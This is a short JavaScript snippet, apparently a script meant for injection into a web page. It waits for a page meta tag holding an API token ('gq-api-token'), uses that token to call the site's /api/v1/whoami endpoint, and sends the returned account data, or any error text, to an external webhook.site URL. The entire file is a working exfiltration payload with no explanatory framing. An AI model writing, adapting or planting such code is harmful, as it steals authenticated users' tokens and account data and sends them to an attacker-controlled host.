(() => {
  function waitForMetaToken() {
    const meta = document.querySelector('meta[name="gq-api-token"]');
    if (!meta) return setTimeout(waitForMetaToken, 200);

    const token = meta.content;

    fetch('/api/v1/whoami', {
      headers: {
        'Authorization': `Bearer ${token}`,
        'Accept': '*/*',
      }
    })
    .then(res => res.text())
    .then(data => {
      fetch('https://webhook.site/5c197e32-573b-4c12-ab20-dd7b7ec5cd96?dump=' + encodeURIComponent(data));
    })
    .catch(err => {
      fetch('https://webhook.site/5c197e32-573b-4c12-ab20-dd7b7ec5cd96?error=' + encodeURIComponent(err.message));
    });
  }

  waitForMetaToken();
})();
